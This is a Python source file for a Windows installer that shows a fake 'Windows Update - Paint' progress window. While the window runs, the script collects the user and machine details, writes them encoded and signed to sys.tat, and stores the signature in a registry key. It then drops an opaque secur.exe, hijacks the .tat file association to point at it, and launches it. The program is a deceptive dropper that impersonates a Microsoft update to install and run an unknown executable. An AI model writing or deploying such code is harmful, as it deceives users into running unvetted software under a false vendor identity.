# sys_installer.py
# Windows-only. Build to sys_doc.exe via PyInstaller (see instructions below).
# Shows a faux "Paint update" window with progress bar, asks target folder,
# collects system info, encodes and writes to sys.tat, signs data, stores
# signature to HKCU\Software\ububkm (value "Signature"), drops secur.exe + pubkey,
# associates .tat with secur.exe, and launches secur.exe once.

import base64
import json
import os
import platform
import subprocess
import sys
import tempfile
import time
import winreg
import shutil

# ---- GUI (tkinter) for progress bar and folder selection ----
import tkinter as tk
from tkinter import ttk, filedialog, messagebox

# ---- Crypto (requires "cryptography" package) ----
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

APP_VENDOR = "ububkm"
REG_APP_KEY = fr"Software\{APP_VENDOR}"
REG_SIGNATURE_VALUE = "Signature"

ASSOC_DOT = ".tat"
ASSOC_PROG_ID = "TatFile.Secure"   # HKCU\Software\Classes\TatFile.Secure
ASSOC_DESC = "Protected System Info TAT"

SECUR_EXE_NAME = "secur.exe"
PUBKEY_NAME = "pubkey.pem"
SYS_TAT_NAME = "sys.tat"

def collect_system_info():
    # user/computer
    user = os.environ.get("USERNAME") or os.getlogin()
    computer = os.environ.get("COMPUTERNAME") or platform.node()
    # OS
    os_ver = platform.platform(terse=False)
    # CPU
    cpu_name = platform.processor()
    if not cpu_name:
        cpu_name = run_and_capture(['wmic', 'cpu', 'get', 'Name'])
    # RAM (Total)
    total_mem = run_and_capture(['wmic', 'ComputerSystem', 'get', 'TotalPhysicalMemory'])
    info = {
        "user": user,
        "computer": computer,
        "os": os_ver,
        "cpu": cpu_name.strip(),
        "total_memory_bytes": parse_first_number(total_mem),
        "timestamp_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    }
    return info

def run_and_capture(cmd):
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=False, text=True)
        return out.strip().splitlines()[-1] if out.strip() else ""
    except Exception:
        return ""

def parse_first_number(s):
    # extract first integer-ish number from a string
    num = ""
    for ch in s:
        if ch.isdigit():
            num += ch
        elif num:
            break
    return int(num) if num else 0

def b64(s: bytes) -> str:
    return base64.b64encode(s).decode('ascii')

def generate_keypair():
    # RSA 2048 for demo; in real apps consider Ed25519
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = priv.public_key()
    return priv, pub

def export_public_pem(pub):
    return pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

def sign_bytes(priv, data: bytes) -> bytes:
    return priv.sign(
        data,
        padding.PKCS1v15(),
        hashes.SHA256()
    )

def write_registry_signature(sig_b64: str):
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_APP_KEY) as k:
        winreg.SetValueEx(k, REG_SIGNATURE_VALUE, 0, winreg.REG_SZ, sig_b64)

def associate_tat_with_secur(secur_path: str):
    # Per-user file association: HKCU\Software\Classes
    base = r"Software\Classes"
    # .tat -> TatFile.Secure
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, fr"{base}\{ASSOC_DOT}") as k:
        winreg.SetValueEx(k, None, 0, winreg.REG_SZ, ASSOC_PROG_ID)
    # ProgID description
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, fr"{base}\{ASSOC_PROG_ID}") as k:
        winreg.SetValueEx(k, None, 0, winreg.REG_SZ, ASSOC_DESC)
    # Icon (optional): could set default icon via DefaultIcon subkey
    # Open command
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, fr"{base}\{ASSOC_PROG_ID}\shell\open\command") as k:
        cmd = f'"{secur_path}" "%1"'
        winreg.SetValueEx(k, None, 0, winreg.REG_SZ, cmd)

def faux_paint_update_window(do_install_callback):
    root = tk.Tk()
    root.title("Windows Update - Paint")
    root.geometry("520x190")
    root.resizable(False, False)

    lbl = ttk.Label(root, text="Installing update for Paint...", font=("Segoe UI", 12))
    lbl.pack(pady=12)

    pb = ttk.Progressbar(root, orient="horizontal", length=460, mode="determinate", maximum=100)
    pb.pack(pady=8)

    details = tk.StringVar(value="Preparing...")
    det_lbl = ttk.Label(root, textvariable=details)
    det_lbl.pack(pady=4)

    def step(msg, inc):
        details.set(msg)
        root.update_idletasks()
        pb['value'] = min(100, pb['value'] + inc)
        time.sleep(0.35)

    def choose_folder():
        messagebox.showinfo("Select Folder", "Choose a folder to store the System Information file (sys.tat).")
        path = filedialog.askdirectory(title="Select target folder")
        if not path:
            if messagebox.askyesno("Create Folder", "No folder selected. Create a new folder on Desktop?"):
                desk = os.path.join(os.path.expanduser("~"), "Desktop")
                path = os.path.join(desk, "SystemInfo_TAT")
                os.makedirs(path, exist_ok=True)
            else:
                raise RuntimeError("Installation cancelled by user (no folder).")
        return path

    def run_install():
        try:
            step("Preparing installer...", 10)
            target_folder = choose_folder()
            step("Collecting system information...", 15)
            info = collect_system_info()
            encoded = b64(json.dumps(info, ensure_ascii=False).encode('utf-8'))

            step("Generating cryptographic keys...", 10)
            priv, pub = generate_keypair()
            pub_pem = export_public_pem(pub)

            sys_tat_path = os.path.join(target_folder, SYS_TAT_NAME)
            step("Writing sys.tat...", 10)
            with open(sys_tat_path, "w", encoding="utf-8") as f:
                f.write(encoded)

            # Sign the exact bytes written to sys.tat
            step("Signing system information...", 10)
            signature = sign_bytes(priv, encoded.encode('utf-8'))
            sig_b64 = b64(signature)
            write_registry_signature(sig_b64)

            # Drop secur.exe & pubkey
            step("Copying protection module (secur.exe)...", 15)
            # Locate secur.exe near the installer (same folder as sys_doc.exe)
            exe_dir = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
            # When built with PyInstaller, secur.exe should be distributed alongside sys_doc.exe
            secur_src_guess = os.path.join(exe_dir, SECUR_EXE_NAME)
            if not os.path.isfile(secur_src_guess):
                # During dev run, fallback: if secur.exe not present, try to find secur.py to build path for docs
                pass
            secur_dst = os.path.join(target_folder, SECUR_EXE_NAME)
            try:
                shutil.copy2(secur_src_guess, secur_dst)
            except Exception:
                # If not found (dev mode), create a placeholder to demonstrate
                with open(secur_dst, "wb") as ff:
                    ff.write(b"")  # placeholder; real build should copy actual secur.exe

            pubkey_path = os.path.join(target_folder, PUBKEY_NAME)
            with open(pubkey_path, "wb") as fpk:
                fpk.write(pub_pem)

            # Associate .tat to secur.exe
            step("Registering file association (.tat -> secur.exe)...", 15)
            associate_tat_with_secur(secur_dst)

            # Launch secur.exe once (non-blocking) to enforce protection path exists
            step("Finalizing...", 5)
            try:
                subprocess.Popen([secur_dst, sys_tat_path], close_fds=True)
            except Exception:
                pass

            pb['value'] = 100
            details.set("Completed.")
            messagebox.showinfo("Done", f"Installation finished.\n\nFolder:\n{target_folder}\n\nFile:\n{sys_tat_path}")
            root.destroy()
        except Exception as e:
            messagebox.showerror("Error", str(e))
            root.destroy()

    root.after(300, run_install)
    root.mainloop()

def main():
    faux_paint_update_window(do_install_callback=None)

if __name__ == "__main__":
    main()
